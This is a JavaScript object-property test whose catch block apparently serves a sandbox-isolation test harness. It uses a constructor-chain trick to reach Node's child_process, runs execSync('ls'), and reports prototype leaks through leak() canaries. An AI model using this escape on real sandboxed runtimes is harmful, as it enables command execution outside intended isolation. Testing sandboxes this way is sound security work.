try {
    var __map = {
        shape: 'cube',
        5: 'five',
        '6': 'six'
    };
    if (__map.shape !== 'cube') {
        $ERROR('#1: var __map={shape:"cube", 5:"five", "6":"six"}; __map.shape === "cube". Actual: ' + __map.shape);
    }
    if (__map['shape'] !== 'cube') {
        $ERROR('#2: var __map={shape:"cube", 5:"five", "6":"six"}; __map["shape"] === "cube". Actual: ' + __map['shape']);
    }
    if (__map['5'] !== 'five') {
        $ERROR('#3: var __map={shape:"cube", 5:"five", "6":"six"}; __map["5"] === "five". Actual: ' + __map['5']);
    }
    if (__map[5] !== 'five') {
        $ERROR('#4: var __map={shape:"cube", 5:"five", "6":"six"}; __map[5] === "five". Actual: ' + __map[5]);
    }
    if (__map['6'] !== 'six') {
        $ERROR('#5: var __map={shape:"cube", 5:"five", "6":"six"}; __map["6"] === "six". Actual: ' + __map['6']);
    }
    if (__map[6] !== 'six') {
        $ERROR('#6: var __map={shape:"cube", 5:"five", "6":"six"}; __map[6] === "six". Actual: ' + __map[6]);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}